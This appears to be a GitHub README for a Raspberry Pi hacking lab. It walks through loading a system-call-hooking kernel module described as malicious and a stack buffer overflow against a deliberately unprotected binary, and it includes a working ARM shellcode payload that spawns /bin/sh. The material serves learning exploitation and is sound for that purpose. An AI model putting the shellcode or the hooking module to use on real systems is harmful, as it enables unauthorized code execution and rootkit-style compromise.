# HackRPi
## Insert kernel files to RPi
- **Step 1**: Mount SD card  
```
kss@ubuntu:~/HackRPi$ sudo mkdir /mnt/raspi
kss@ubuntu:~/HackRPi$ sudo mkdir /mnt/fs
kss@ubuntu:~/HackRPi$ sudo mount /dev/sdb1 /mnt/raspi
kss@ubuntu:~/HackRPi$ sudo mount /dev/sdb2 /mnt/fs
```
- **Step 2**: Copy kernel image  
```
kss@ubuntu:~/HackRPi$ sudo cp ./linux/zImage /mnt/raspi/kernel7.img
```
- **Step 3**: Copy modules  
```
kss@ubuntu:~/HackRPi$ sudo cp -r ./linux/4.4.50-v7+/ /mnt/fs/lib/modules/
```
- **Step 4**: Copy device tree blob  
```
kss@ubuntu:~/HackRPi$ sudo cp ./linux/*.dtb /mnt/raspi/
```
- **Step 5**: Copy device tree blob overlays  
```
kss@ubuntu:~/HackRPi$ sudo cp ./linux/*.dtb* /mnt/raspi/overlays
kss@ubuntu:~/HackRPi$ sudo cp ./linux/README /mnt/raspi/overlays
```
- **Step 6**: Unmount SD card  
```
kss@ubuntu:~/HackRPi$ sudo umount /mnt/raspi
kss@ubuntu:~/HackRPi$ sudo umount /mnt/fs
```
## System call hooking 🐱‍💻
- **Step 1**: Check malicious module  
![image](https://user-images.githubusercontent.com/20378368/107459865-6d6e1a80-6b9a-11eb-9713-7319c7e2b622.png)  
- **Step 2**: Check SD card  
![image](https://user-images.githubusercontent.com/20378368/107325262-d303cd80-6aec-11eb-85fe-6e6c9f196352.png)  
```
kss@ubuntu:~/HackRPi/Hook$ lsblk
```
- **Step 3**: Mount SD card  
```
kss@ubuntu:~/HackRPi/Hook$ sudo mount /dev/sdb1 /mnt/raspi
kss@ubuntu:~/HackRPi/Hook$ sudo mount /dev/sdb2 /mnt/fs
```
- **Step 4**: Copy malicious module  
```
kss@ubuntu:~/HackRPi/Hook$ cd ..
kss@ubuntu:~/HackRPi$ sudo cp -r ./Hook /mnt/fs/home/pi
kss@ubuntu:~/HackRPi$ sudo umount /mnt/raspi
kss@ubuntu:~/HackRPi$ sudo umount /mnt/fs
```
- **Step 5**: Insert malicious module to RPi  
```
pi@raspberrypi:~/Hook$ sudo insmod hooker.ko
```
- **Result**  
![image](https://user-images.githubusercontent.com/20378368/107609218-a0d7a480-6c81-11eb-9e77-83a704dfe2c9.png)  

## Buffer Overflow 🐱‍💻
- **Step 1**: Compile without stack protection  
```
pi@korkeep:~/BOF $ gcc -fno-stack-protector -z execstack BOF.c -o BOF
```
- **Step 2**: Debugging with gdb  
```
pi@korkeep:~/BOF $ gdb -q BOF
```
- **Step 3**: Disassemble the main function  
![image](https://user-images.githubusercontent.com/20378368/107646868-d0a49d80-6cbd-11eb-833b-0ac58a158e63.png)  
```
(gdb) disassemble main
```
- **Step 4**: Set a breakpoint to hack  
```
// Breakpoint target:
// 0x00010530 <+40>:    mov     r3, #0
(gdb) b *0x00010530
```
- **Step 5**: Analyze address state  
![image](https://user-images.githubusercontent.com/20378368/107655183-a86d6c80-6cc6-11eb-9a09-7223b26fdd69.png)  
```
(gdb) x/100x $sp-200
```
- **Step 6**: Buffer overflow using NOP sled  
```
// Target address: 0x7efff570
(gdb) run $(python -c 'print "\x01\x10\xa0\xe1"*17+"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x2d\x1c\x2f\x62\x69\x6e\x2f\x73\x68\x58"+"AAAA"+"\x70\xf5\xff\x7e"')
```
- **Result**  
![image](https://user-images.githubusercontent.com/20378368/107657001-0f3f5580-6cc8-11eb-8ff5-fa81d2fabe03.png)  

## Return-Oriented Programming 🐱‍💻

## Return-To-Libc 🐱‍💻
